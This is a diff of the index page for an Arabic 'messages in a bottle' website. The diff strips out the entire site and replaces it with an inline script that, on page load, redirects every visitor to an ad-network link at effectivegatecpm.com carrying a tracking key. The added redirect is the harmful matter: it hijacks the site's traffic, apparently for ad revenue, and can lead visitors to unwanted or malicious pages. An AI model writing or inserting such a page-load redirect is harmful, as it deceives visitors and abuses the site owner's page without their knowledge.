@@ -1,198 +1,11 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>زجاجات رقمية - رسائل في البحر</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🌊</text></svg>">
+<meta charset="UTF-8">
+<script>
+window.location.replace("https://www.effectivegatecpm.com/f6uuh2c4k?key=29a26ca6460d7ca7b1146932eaf28980");
+</script>
 </head>
 <body>
-    <div class="container">
-        <!-- الشاطئ -->
-        <div class="beach">
-            <div class="sun"></div>
-            <div class="wave wave1"></div>
-            <div class="wave wave2"></div>
-            <div class="wave wave3"></div>
-            
-            <!-- الزجاجات العائمة -->
-            <div class="floating-bottles">
-                <div class="bottle bottle1" data-bottle="1">🌊</div>
-                <div class="bottle bottle2" data-bottle="2">🌊</div>
-                <div class="bottle bottle3" data-bottle="3">🌊</div>
-                <div class="bottle bottle4" data-bottle="4">🌊</div>
-            </div>
-            
-            <!-- الطيور -->
-            <div class="bird bird1">🐦</div>
-            <div class="bird bird2">🐦</div>
-        </div>
-
-        <!-- الرأسية -->
-        <header class="header">
-            <h1 class="logo">🌊 زجاجات رقمية</h1>
-            <p class="tagline">أرسل رسالة حلوة.. وصادف زجاجة سعيدة!</p>
-        </header>
-
-        <!-- المحتوى الرئيسي -->
-        <main class="main-content">
-            <!-- إحصائيات مبسطة -->
-            <div class="stats">
-                <div class="stat-item">
-                    <i class="fas fa-water"></i>
-                    <span id="totalMessages">1,234</span>
-                    <p>زجاجة في البحر</p>
-                </div>
-                <div class="stat-item">
-                    <i class="fas fa-globe"></i>
-                    <span id="countries">42</span>
-                    <p>دولة حول العالم</p>
-                </div>
-                <div class="stat-item">
-                    <i class="fas fa-shield-alt"></i>
-                    <span id="filtered">0</span>
-                    <p>رسائل تمت فلترتها</p>
-                </div>
-            </div>
-
-            <!-- أزرار العمل المبسطة -->
-            <div class="action-buttons">
-                <button class="btn btn-primary" id="writeBtn">
-                    <i class="fas fa-pen"></i> أكتب رسالة
-                </button>
-                <button class="btn btn-secondary" id="catchBtn">
-                    <i class="fas fa-fishing-rod"></i> أصطاد زجاجة
-                </button>
-            </div>
-
-            <!-- تنبيه الفلترة -->
-            <div class="filter-alert hidden" id="filterAlert">
-                <div class="alert-content">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    <p>الرسالة تحتوي على كلمات غير مناسبة. الرجاء التعديل.</p>
-                    <button class="alert-close" id="closeAlert">✕</button>
-                </div>
-            </div>
-
-            <!-- قسم الرسائل -->
-            <div class="message-section">
-                <!-- كتابة رسالة -->
-                <div class="write-message hidden" id="writeMessage">
-                    <h2><i class="fas fa-feather-alt"></i> اكتب رسالتك</h2>
-                    <textarea id="messageInput" placeholder="اكتب رسالة لطيفة، طريفة، أو مشجعة... ستنتهي رحلتها عند شخص يحتاجها ❤️" maxlength="300"></textarea>
-                    <div class="message-footer">
-                        <span id="charCount">0/300</span>
-                        <div class="mood-selector">
-                            <span>مزاج الرسالة:</span>
-                            <div class="moods">
-                                <button class="mood-btn" data-mood="happy">😊 سعيدة</button>
-                                <button class="mood-btn" data-mood="funny">😂 طريفة</button>
-                                <button class="mood-btn" data-mood="encouraging">💪 مشجعة</button>
-                                <button class="mood-btn" data-mood="cute">🐱 كيوت</button>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="message-tips">
-                        <p><i class="fas fa-lightbulb"></i> نصائح لرسالة رائعة:</p>
-                        <ul>
-                            <li>💬 اكتب رسالة إيجابية ومشجعة</li>
-                            <li>✨ شارك فكرة لطيفة أو دعاء جميل</li>
-                            <li>🎯 تجنب الكلمات السيئة أو الجارحة</li>
-                            <li>❤️ اجعل شخصًا يبتسم اليوم!</li>
-                        </ul>
-                    </div>
-                    <button class="btn btn-send" id="sendBtn">
-                        <i class="fas fa-paper-plane"></i> ألقي الزجاجة في البحر
-                    </button>
-                </div>
-
-                <!-- عرض الرسالة -->
-                <div class="message-display hidden" id="messageDisplay">
-                    <div class="message-header">
-                        <h2><i class="fas fa-bottle-water"></i> وجدت زجاجة!</h2>
-                        <button class="close-btn" id="closeMessage">✕</button>
-                    </div>
-                    <div class="message-content">
-                        <div class="bottle-icon">🏺</div>
-                        <p id="receivedMessage">جاري تحميل الرسالة...</p>
-                        <div class="message-info">
-                            <span id="messageMood">😊</span>
-                            <span id="messageDate">اليوم</span>
-                            <span class="message-filtered hidden" id="messageFiltered"><i class="fas fa-shield-alt"></i> تمت الفلترة</span>
-                        </div>
-                    </div>
-                    <div class="message-actions">
-                        <button class="action-btn" id="replyBtn">
-                            <i class="fas fa-reply"></i> رد برسالة جديدة
-                        </button>
-                        <button class="action-btn" id="newBottleBtn">
-                            <i class="fas fa-water"></i> زجاجة أخرى
-                        </button>
-                    </div>
-                </div>
-
-                <!-- رسالة تأكيد -->
-                <div class="confirmation hidden" id="confirmation">
-                    <div class="confirmation-content">
-                        <div class="confirmation-icon">🎉</div>
-                        <h2>رائعة! ألقيت زجاجتك في البحر</h2>
-                        <p>زجاجتك ستصل إلى شخص يحتاجها قريبًا جدًا 🌊</p>
-                        <button class="btn btn-continue" id="continueBtn">
-                            <i class="fas fa-water"></i> استمر في الرحلة
-                        </button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- تعليمات مبسطة -->
-            <div class="instructions">
-                <h3><i class="fas fa-info-circle"></i> كيف يعمل الموقع؟</h3>
-                <div class="steps">
-                    <div class="step">
-                        <div class="step-number">1</div>
-                        <p>اكتب رسالة إيجابية</p>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">2</div>
-                        <p>ألقيها في البحر</p>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">3</div>
-                        <p>شخص آخر سيصطادها!</p>
-                    </div>
-                </div>
-                <div class="safety-notice">
-                    <i class="fas fa-shield-alt"></i>
-                    <p>نحن نحافظ على بيئة إيجابية ونفلتر الرسائل تلقائيًا</p>
-                </div>
-            </div>
-        </main>
-
-        <!-- الفوتر -->
-        <footer class="footer">
-            <p>صنع ب ❤️ لنشر الإيجابية حول العالم | <span id="filterStats">0 رسائل تمت فلترتها</span></p>
-            <div class="social">
-                <button class="social-btn" id="shareBtn">
-                    <i class="fas fa-share-alt"></i> شارك الموقع
-                </button>
-                <button class="social-btn" id="themeBtn">
-                    <i class="fas fa-moon"></i> الوضع الليلي
-                </button>
-                <button class="social-btn" id="soundToggle">
-                    <i class="fas fa-volume-mute"></i> إيقاف الأصوات
-                </button>
-            </div>
-        </footer>
-    </div>
-
-    <!-- الأصوات (اختيارية) -->
-    <audio id="waveSound" src="https://assets.mixkit.co/sfx/preview/mixkit-waves-on-the-beach-1186.mp3" preload="auto"></audio>
-    <audio id="bottleSound" src="https://assets.mixkit.co/sfx/preview/mixkit-glass-bottle-pop-1935.mp3" preload="auto"></audio>
-    <audio id="alertSound" src="https://assets.mixkit.co/sfx/preview/mixkit-warning-alarm-buzzer-985.mp3" preload="auto"></audio>
-
-    <script src="script.js"></script>
 </body>
 </html>
